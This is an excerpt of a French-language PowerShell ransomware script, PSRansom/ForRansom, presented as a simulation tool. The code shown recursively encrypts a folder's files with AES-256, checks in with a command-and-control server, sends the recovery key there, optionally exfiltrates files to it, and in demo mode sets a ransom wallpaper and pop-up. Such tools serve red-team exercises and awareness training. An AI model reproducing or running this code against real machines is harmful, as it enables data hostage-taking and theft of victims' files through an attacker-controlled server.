...
# Help
function Show-Help {
   Write-host ; Write-Host " Info : " -ForegroundColor Yellow -NoNewLine ; Write-Host " Cet outil vous permet de simuler le processus de chiffrement d'un"
   Write-Host "        ransomware generique dans PowerShell avec un C2 qui existe."
   Write-Host ; Write-Host " Usage : " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\PSRansom.ps1 -e Dossier -s C2IP -p C2Port" -ForegroundColor Blue 
   Write-Host "          Chiffrement de tous les fichiers et envoi de la cle de recuperation au serveur de Command & Control" -ForegroundColor Green
   Write-Host "          Utilisez -x pour exfiltrer et dechiffrer des fichiers sur le serveur de Command & Control" -ForegroundColor Green
   Write-Host "          Utilisez -demo pour avoir un pop-up" -ForegroundColor Green
   Write-Host ; Write-Host "        .\PSRansom.ps1 -d Dossier -k Cle" -ForegroundColor Blue 
   Write-Host "          Dechiffrement de tous les fichiers a l'aide de la cle generee" -ForegroundColor Green
   Write-Host ; Write-Host " Attention: " -ForegroundColor Red -NoNewLine  ; Write-Host "Toutes les informations seront envoyees au serveur de Command & Control sans aucun chiffrement."
...
if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Pas assez de parametres!" -ForegroundColor Red ; Write-Host ; break }
if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Pas assez de parametres!" -ForegroundColor Red ; Write-Host ; break }
...
[Wallpaper]::SetWallpaper("C:\Temp\PSRansom.jpg")
	 #[CurrentUser.Desktop]::SetBackground(250, 25, 50)
	}
}
...
$form.Text = "ForRansom By Formind Ouest"
$formIcon = New-Object system.drawing.icon ("C:\Temp\PSRansom.ico") 
$form.Icon = $formicon  

$img = [System.Drawing.Image]::Fromfile("C:\Temp\PSRansom.jpg")
...
$label.Text = "All your files have been encrypted by ForRansom!" 
$label.AutoSize = $true 
...
function ShowInfo {
   Write-Host ; Write-Host "[>] Nom de la machine: " -NoNewLine -ForegroundColor Yellow ; Write-Host $computer
   Write-Host "[>] Utilisateur: " -NoNewLine -ForegroundColor Yellow ; Write-Host $domain$user
   Write-Host "[>] Heure: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time }

function GetStatus {
   Try { Invoke-WebRequest -useb "$C2Server`:$C2Port/status" -Method GET 
      Write-Host "[i] Command & Control disponible !" -ForegroundColor Green }
   Catch { Write-Host "[!] Command & Control non disponible!" -ForegroundColor Red }}
...
function EncryptFiles { 
   ...
   Add-Content -Path "$Directory$slash$Readme" -Value "[!] Aucun fichier n'a ete chiffre !" }}
...
function DecryptFiles {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      ...
      Write-Host "[+] $rfile est maintenant dechiffre" -ForegroundColor Blue } ; Remove-Item "$Directory$slash$Readme" }

function CheckFiles { 
   $RFiles = Get-ChildItem $Directory -recurse -filter *.psr ; if ($RFiles) { $RFiles | Remove-Item } else {
   Write-Host "[!] Aucun fichier chiffre n'a ete trouve !" -ForegroundColor Red }}

# Main
Show-Banner ; ShowInfo

if ($Mode -eq "-d") { 
   Write-Host ; Write-Host "[!] Recuperation d'une infection par un ransomware sur le repertoire $DirectoryTarget...." -ForegroundColor Red
   Write-Host "[i]Application de la cle de recuperation sur les fichiers chiffres .." -ForegroundColor Green
   DecryptFiles ; CheckFiles ; sleep 1 }
 
else {
   Write-Host ; Write-Host "[!] Simulation d'une infection par un ransomware sur le repertoire $DirectoryTarget..." -ForegroundColor Red
   Write-Host "[+] Verification de la communication avec le serveur de Command & Control..." -ForegroundColor Blue
   $C2Status = GetStatus ; sleep 1

   Write-Host "[+] Generation d'une nouvelle cle aleatoire pour le chiffrement..." -ForegroundColor Blue
   $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})

   Write-Host "[!] Chiffrement de tous les fichiers avec une cle AES 256 bits..." -ForegroundColor Red
   CreateReadme ; EncryptFiles ; if ($C2Status) { SendResults ; sleep 1

   if ($Exfil -eq "-x") { Write-Host "[i] Exfiltration des fichiers vers le serveur Command & Control.." -ForegroundColor Green
      ExfiltrateFiles ; sleep 1 }}

   if (!$C2Status) { Write-Host "[+] Enregistrement des logs et de la cle dans le fichier readme.txt...." -ForegroundColor Blue }
   else { Write-Host "[+] Envoi des journaux et de la cle au serveur de Command & Control..." -ForegroundColor Blue }}

   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
   if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
   else { SendOK }

sleep 1 ; Write-Host "[i] Fini!" -ForegroundColor Green ; Write-Host
